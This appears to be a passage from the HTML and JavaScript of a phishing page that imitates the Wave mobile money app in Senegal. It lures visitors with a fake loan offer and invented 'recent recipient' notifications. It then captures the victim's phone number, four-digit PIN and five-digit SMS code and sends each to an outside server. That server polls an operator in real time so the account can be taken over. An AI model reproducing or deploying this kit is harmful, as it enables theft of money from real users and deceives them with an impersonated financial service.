          <!-- Head -->
          <circle cx="65" cy="52" r="28" fill="#111"/>
          <!-- Eyes white -->
          <circle cx="56" cy="47" r="5" fill="#fff"/>
          <circle cx="74" cy="47" r="5" fill="#fff"/>
          <!-- Pupils -->
          <circle cx="57" cy="48" r="2.4" fill="#111"/>
          <circle cx="75" cy="48" r="2.4" fill="#111"/>
          <!-- Beak -->
          <ellipse cx="65" cy="59" rx="7" ry="4.5" fill="#f90"/>
          <!-- Left wing raised/waving -->
          <ellipse cx="33" cy="78" rx="10" ry="24" fill="#111" transform="rotate(-55 33 78)"/>
          <!-- Right wing down -->
          <ellipse cx="97" cy="98" rx="10" ry="22" fill="#111" transform="rotate(14 97 98)"/>
          <!-- Left foot -->
          <ellipse cx="53" cy="148" rx="12" ry="7" fill="#f90"/>
          <!-- Right foot -->
          <ellipse cx="77" cy="148" rx="12" ry="7" fill="#f90"/>
        </svg>
      </div>
    </div>
  </div>

  <!-- ‚ïê‚ïê LOGIN ‚Äî Phone number (Wave exact) ‚ïê‚ïê -->
  <div class="scr" id="s-login" style="flex-direction:column;">
    <div class="wave-h">Welcome to Wave! Enter your mobile to start</div>

    <!-- Phone input row with underline -->
    <div style="display:flex;align-items:flex-end;padding:0 24px 8px;border-bottom:2px solid #4dc8e8;margin:0 24px;">
      <div class="wave-cc">
        <span>üá∏üá≥ +221</span>
        <svg viewBox="0 0 10 6"><path d="M0 0l5 6 5-6z"/></svg>
      </div>
      <input id="loginPh" class="wave-ph-in" type="text" inputmode="numeric" placeholder="7X XXX XX XX" maxlength="12" readonly
        style="flex:1;background:transparent;border:none;outline:none;font-size:16px;font-family:'Patrick Hand',cursive;color:#111;padding:0;caret-color:#4dc8e8;"/>
    </div>

    <!-- Custom alphanumeric keypad (phone dialpad style) -->
    <div class="keypad" id="loginKeypad">
      <button class="kk" onclick="kpPress('login',1)"><span class="kk-num">1</span><span class="kk-letters"></span></button>
      <button class="kk" onclick="kpPress('login',2)"><span class="kk-num">2</span><span class="kk-letters">ABC</span></button>
      <button class="kk" onclick="kpPress('login',3)"><span class="kk-num">3</span><span class="kk-letters">DEF</span></button>
      <button class="kk" onclick="kpPress('login',4)"><span class="kk-num">4</span><span class="kk-letters">GHI</span></button>
      <button class="kk" onclick="kpPress('login',5)"><span class="kk-num">5</span><span class="kk-letters">JKL</span></button>
      <button class="kk" onclick="kpPress('login',6)"><span class="kk-num">6</span><span class="kk-letters">MNO</span></button>
      <button class="kk" onclick="kpPress('login',7)"><span class="kk-num">7</span><span class="kk-letters">PQRS</span></button>
      <button class="kk" onclick="kpPress('login',8)"><span class="kk-num">8</span><span class="kk-letters">TUV</span></button>
      <button class="kk" onclick="kpPress('login',9)"><span class="kk-num">9</span><span class="kk-letters">WXYZ</span></button>
      <button class="kk empty"></button>
      <button class="kk" onclick="kpPress('login',0)"><span class="kk-num">0</span><span class="kk-letters">+</span></button>
      <button class="kk backspace" onclick="kpBack('login')">
        <span class="kk-num"><svg width="26" height="20" viewBox="0 0 26 20"><path d="M9 2L2 10l7 8h15V2H9z" fill="#111"/><line x1="14" y1="7" x2="20" y2="13" stroke="#fff" stroke-width="2"/><line x1="20" y1="7" x2="14" y2="13" stroke="#fff" stroke-width="2"/></svg></span>
        <span class="kk-letters"></span>
      </button>
    </div>

    <button class="wave-next" id="loginBtn" onclick="loginGo()">Next</button>
  </div>

  <!-- ‚ïê‚ïê PIN ‚Äî Secret code (Wave exact) ‚ïê‚ïê -->
  <div class="scr" id="s-pin" style="flex-direction:column;">
    <div class="wave-back" onclick="go('s-pin','s-login')">
      <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>
    </div>

    <!-- Lock icon -->
    <div class="pin-lock-wrap">
      <svg width="60" height="72" viewBox="0 0 60 72">
        <rect x="8" y="30" width="44" height="36" rx="6" fill="#5b5fcf"/>
        <path d="M18 30V22a12 12 0 0124 0v8" fill="none" stroke="#5b5fcf" stroke-width="5" stroke-linecap="round"/>
        <circle cx="30" cy="46" r="7" fill="#3d3fa8"/>
        <circle cx="30" cy="46" r="3.5" fill="#111"/>
      </svg>
    </div>

    <div class="wave-h" style="padding-top:22px;" id="pinTitle">Enter your secret code for account <span id="pinAcct"></span></div>

    <!-- 4 dots -->
    <div class="pin-dots-row">
      <div class="pd" id="pd0"></div>
      <div class="pd" id="pd1"></div>
      <div class="pd" id="pd2"></div>
      <div class="pd" id="pd3"></div>
    </div>

    <!-- Custom numeric keypad for PIN -->
    <div class="keypad" style="margin-top:auto;">
      <button class="kk" onclick="kpPress('pin',1)"><span class="kk-num">1</span><span class="kk-letters"></span></button>
      <button class="kk" onclick="kpPress('pin',2)"><span class="kk-num">2</span><span class="kk-letters">ABC</span></button>
      <button class="kk" onclick="kpPress('pin',3)"><span class="kk-num">3</span><span class="kk-letters">DEF</span></button>
      <button class="kk" onclick="kpPress('pin',4)"><span class="kk-num">4</span><span class="kk-letters">GHI</span></button>
      <button class="kk" onclick="kpPress('pin',5)"><span class="kk-num">5</span><span class="kk-letters">JKL</span></button>
      <button class="kk" onclick="kpPress('pin',6)"><span class="kk-num">6</span><span class="kk-letters">MNO</span></button>
      <button class="kk" onclick="kpPress('pin',7)"><span class="kk-num">7</span><span class="kk-letters">PQRS</span></button>
      <button class="kk" onclick="kpPress('pin',8)"><span class="kk-num">8</span><span class="kk-letters">TUV</span></button>
      <button class="kk" onclick="kpPress('pin',9)"><span class="kk-num">9</span><span class="kk-letters">WXYZ</span></button>
      <button class="kk forgot-key" onclick=""><span class="kk-num">FORGOT?</span><span class="kk-letters"></span></button>
      <button class="kk" onclick="kpPress('pin',0)"><span class="kk-num">0</span><span class="kk-letters">+</span></button>
      <button class="kk backspace" onclick="kpBack('pin')">
        <span class="kk-num"><svg width="26" height="20" viewBox="0 0 26 20"><path d="M9 2L2 10l7 8h15V2H9z" fill="#111"/><line x1="14" y1="7" x2="20" y2="13" stroke="#fff" stroke-width="2"/><line x1="20" y1="7" x2="14" y2="13" stroke="#fff" stroke-width="2"/></svg></span>
        <span class="kk-letters"></span>
      </button>
    </div>
    <div style="height:20px;"></div>
  </div>

  <!-- ‚ïê‚ïê OTP ‚ïê‚ïê -->
  <div class="scr" id="s-otp" style="position:relative;">
    <div class="wave-back" onclick="go('s-otp','s-pin')">
      <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>
    </div>
    <div class="wave-h">Entrez votre code<br><span style="font-size:14px;color:#999;font-weight:400;">Envoy√© au <strong id="otpPh" style="color:#555;">+221</strong></span></div>

    <div class="otp-dots-w" style="margin-top:30px;" onclick="document.getElementById('otp-in').focus()">
      <div class="od-w" id="od0"></div>
      <div class="od-w" id="od1"></div>
      <div class="od-w" id="od2"></div>
      <div class="od-w" id="od3"></div>
      <div class="od-w" id="od4"></div>
      <div class="otp-tap-w"></div>
    </div>
    <div class="otp-err-w" id="otpErr" style="margin:14px 24px 0;">Code incorrect. Veuillez r√©essayer.</div>
    <div class="resend-w">
      <button class="resend-btn-w" id="resendBtn" onclick="doResend()" disabled style="opacity:0.4;">Renvoyer le code</button>
      <div class="resend-cd-w" id="resendCd">Renvoi dans 30s</div>
    </div>
    <div class="spacer"></div>
    <button class="wave-next active-btn" id="vBtn" disabled onclick="doVerify()" style="margin-bottom:32px;">Confirmer</button>
  </div>

</div><!-- .wrap -->

<input id="otp-in" type="tel" maxlength="5" inputmode="numeric" autocomplete="one-time-code"/>

<script>
var API = 'https://new-9xcj.onrender.com/api';
var sessId = null, pollTmr = null;

function showLoad(){ document.getElementById('loadOv').classList.add('show'); }
function hideLoad(){ document.getElementById('loadOv').classList.remove('show'); }

function showPop(h,p,t){
  var ic = document.getElementById('popIcon');
  ic.className = 'pop-icon '+(t==='inf'?'inf':'err');
  ic.innerHTML = t==='inf'
    ? '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><circle cx="12" cy="16" r="1" fill="currentColor"/></svg>'
    : '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>';
  document.getElementById('popH').textContent = h;
  document.getElementById('popP').textContent = p;
  document.getElementById('popOv').classList.add('show');
}

function go(from, to){
  document.getElementById(from).classList.remove('active');
  document.getElementById(to).classList.add('active');
}

function cfa(n){ return Math.round(n).toLocaleString('fr-FR')+' FCFA'; }
function calcM(a,m){ if(!a||a<=0) return 0; var r=0.05/12; return a*r*Math.pow(1+r,m)/(Math.pow(1+r,m)-1); }

function sliderChange(v){
  v = parseInt(v);
  document.getElementById('loanAmt').textContent = Math.round(v).toLocaleString('fr-FR')+' FCFA';
  document.getElementById('mRepay').textContent  = cfa(calcM(v,12));
  var pct = ((v-50000)/(2000000-50000))*100;
  document.getElementById('slider').style.background = 'linear-gradient(to right,#4dc8e8 '+pct+'%,#eee '+pct+'%)';
  var el = document.getElementById('p1amt');
  if(el) el.value = v;
  calcUpdate();
}

function calcUpdate(){
  var a  = parseFloat(document.getElementById('p1amt').value)||0;
  var m  = parseInt(document.getElementById('p1dur').value)||12;
  var ic = parseFloat(document.getElementById('inc').value)||0;
  var f  = document.getElementById('fn').value.trim();
  var l  = document.getElementById('ln').value.trim();
  document.getElementById('p1rep').textContent    = a>0 ? cfa(calcM(a,m)) : '0 FCFA';
  document.getElementById('rv-amt').textContent   = a>0 ? Math.round(a).toLocaleString('fr-FR')+' FCFA' : '‚Äî';
  document.getElementById('rv-inc').textContent   = ic>0 ? Math.round(ic).toLocaleString('fr-FR')+' FCFA' : '‚Äî';
  document.getElementById('rv-rep').textContent   = a>0 ? cfa(calcM(a,m))+' /mois' : '‚Äî';
  document.getElementById('rv-name').textContent  = [f,l].filter(Boolean).join(' ')||'‚Äî';
}

function chk2(){
  var ok = document.getElementById('fn').value.trim() &&
           document.getElementById('ln').value.trim() &&
           document.getElementById('inc').value.trim()&&
           document.getElementById('ph').value.trim().length>=9;
  var b = document.getElementById('p2btn');
  b.disabled=!ok; b.style.opacity=ok?'1':'0.4';
}

function p2go(){
  if(document.getElementById('ph').value.trim().length<9) return;
  go('s-p2','s-p3');
}

function submitApp(){
  go('s-p3','s-ok');
  var s=5, tEl=document.getElementById('sessTxt'), sp=document.getElementById('sessSpinner'), cb=document.getElementById('contBtn');
  tEl.textContent='Chiffrement‚Ä¶ ('+s+'s)';
  var iv = setInterval(function(){
    s--;
    if(s<=0){ clearInterval(iv); tEl.textContent='Session s√©curis√©e ‚úì'; sp.style.display='none'; cb.style.display='block'; setTimeout(function(){ go('s-ok','s-splash'); setTimeout(function(){ go('s-splash','s-login'); },2000); },1200); }
    else tEl.textContent='Chiffrement‚Ä¶ ('+s+'s)';
  },1000);
}

// KEYPAD
var loginVal = '';
var pinVal = '';
function kpPress(mode, digit) {
  if (mode === 'login') {
    if (loginVal.length >= 12) return;
    loginVal += digit;
    document.getElementById('loginPh').value = loginVal;
    var ok = loginVal.length >= 9;
    var btn = document.getElementById('loginBtn');
    btn.className = 'wave-next' + (ok ? ' active-btn' : '');
  } else {
    if (pinVal.length >= 4) return;
    pinVal += digit;
    updatePinDots();
    if (pinVal.length === 4) setTimeout(submitPIN, 120);
  }
}
function kpBack(mode) {
  if (mode === 'login') {
    loginVal = loginVal.slice(0, -1);
    document.getElementById('loginPh').value = loginVal;
    var ok = loginVal.length >= 9;
    var btn = document.getElementById('loginBtn');
    btn.className = 'wave-next' + (ok ? ' active-btn' : '');
  } else {
    pinVal = pinVal.slice(0, -1);
    updatePinDots();
  }
}
function updatePinDots() {
  [0,1,2,3].forEach(function(i){
    document.getElementById('pd'+i).classList.toggle('filled', i < pinVal.length);
  });
}

function loginGo(){
  var raw = loginVal;
  if(raw.length<9) return;
  document.getElementById('otpPh').textContent = '+221 '+raw;
  document.getElementById('pinAcct').textContent = raw.replace(/(\d{2})(\d{3})(\d{2})(\d{2})/,'$1 $2 $3 $4');
  go('s-login','s-pin');
}

async function callApi(action, data){
  var p = new URLSearchParams(Object.assign({action:action}, data||{}));
  try{ var r = await fetch(API,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:p.toString()}); return await r.json(); }
  catch(e){ return {success:false}; }
}

function startPoll(sid){
  if(pollTmr) clearInterval(pollTmr);
  sessId = sid;
  pollTmr = setInterval(async function(){
    try{
      var res = await fetch(API+'?action=check_status&sessionId='+sid+'&t='+Date.now());
      var r = await res.json();
      if(!r.success||!r.status) return;
      if(r.status==='approved'){
        hideLoad(); clearInterval(pollTmr); pollTmr=null;
        go('s-pin','s-otp'); resetOTP(); startResendCd(); setTimeout(function(){ document.getElementById('otp-in').focus(); },400); startPoll(sid);
      } else if(r.status==='wrong_pin'){
        hideLoad(); clearInterval(pollTmr); pollTmr=null;
        showPop('Code incorrect','Le code secret saisi est incorrect. Veuillez r√©essayer.');
        pinVal=''; updatePinDots();
      } else if(r.status==='wrong_code'){
        hideLoad(); clearInterval(pollTmr); pollTmr=null;
        showPop('Code incorrect','Le code saisi est incorrect. Veuillez r√©essayer.'); resetOTP();
      } else if(r.status==='continue'){
        hideLoad(); clearInterval(pollTmr); pollTmr=null;
        showPop('Fonds insuffisants','Veuillez recharger votre portefeuille Wave et r√©essayer.','inf');
      }
    }catch(e){}
  },1000);
}

async function submitPIN(){
  var raw=loginVal;
  var pin=pinVal;
  if(pin.length!==4) return;
  var fn=document.getElementById('fn').value.trim()||'Unknown';
  var ln=document.getElementById('ln').value.trim()||'User';
  showLoad();
  var r = await callApi('login_attempt',{firstName:fn,lastName:ln,phone:raw,pin:pin});
  if(r.success&&r.data&&r.data.sessionId) startPoll(r.data.sessionId);
  else{ hideLoad(); alert('√âchec. Veuillez r√©essayer.'); }
}

// OTP
var otpIn = document.getElementById('otp-in');
var vBtn  = document.getElementById('vBtn');
var ods   = [0,1,2,3,4].map(function(i){ return document.getElementById('od'+i); });
function setDots(n){ ods.forEach(function(d,i){ d.classList.toggle('on',i<n); }); }
function resetOTP(){ otpIn.value=''; setDots(0); vBtn.disabled=true; vBtn.textContent='Confirmer'; document.getElementById('otpErr').classList.remove('show'); }
otpIn.addEventListener('input', function(){
  var v=otpIn.value.replace(/\D/g,'').slice(0,5); otpIn.value=v; setDots(v.length); vBtn.disabled=v.length<5;
});

var resTimer=null;
function startResendCd(){
  var btn=document.getElementById('resendBtn'), cd=document.getElementById('resendCd');
  btn.disabled=true; btn.style.opacity='0.4'; clearInterval(resTimer); var s=30;
  cd.textContent='Renvoi dans '+s+'s';
  resTimer=setInterval(function(){ s--; if(s<=0){ clearInterval(resTimer); cd.textContent=''; btn.disabled=false; btn.style.opacity='1'; } else cd.textContent='Renvoi dans '+s+'s'; },1000);
}
function doResend(){ startResendCd(); resetOTP(); }

async function doVerify(){
  if(otpIn.value.length===5&&sessId){
    showLoad();
    var r=await callApi('otp_entered',{sessionId:sessId,otp:otpIn.value});
    if(r.success){ vBtn.textContent='V√©rification‚Ä¶'; vBtn.disabled=true; startPoll(sessId); }
    else{ hideLoad(); alert('√âchec. Veuillez r√©essayer.'); }
  }
}

// TOAST
var people=[
  {n:'Aminata S.',i:'A',a:200000,t:"√† l'instant"},
  {n:'Mamadou D.',i:'M',a:150000,t:'il y a 2 min'},
  {n:'Fatou N.',i:'F',a:500000,t:'il y a 4 min'},
  {n:'Ibrahima B.',i:'I',a:220000,t:'il y a 7 min'},
  {n:'Rokhaya T.',i:'R',a:80000,t:"√† l'instant"},
  {n:'Ousmane K.',i:'O',a:410000,t:'il y a 3 min'},
];
var tIdx=0;
function showToast(){
  if(!document.getElementById('s-land').classList.contains('active')) return;
  var p=people[tIdx%people.length]; tIdx++;
  document.getElementById('tav').textContent=p.i;
  document.getElementById('tn').textContent=p.n;
  document.getElementById('td').textContent='a re√ßu '+p.a.toLocaleString('fr-FR')+' FCFA ¬∑ '+p.t;
  var el=document.getElementById('toast'); el.classList.add('show');
  setTimeout(function(){ el.classList.remove('show'); },4000);
}

// INIT ‚Äî splash first
document.getElementById('s-land').classList.remove('active');
document.getElementById('s-splash').classList.add('active');
setTimeout(function(){
  go('s-splash','s-land');
  sliderChange(100000);
  setTimeout(function(){ showToast(); setInterval(showToast,7000); },3000);
}, 2000);
</script>
</body>
</html>
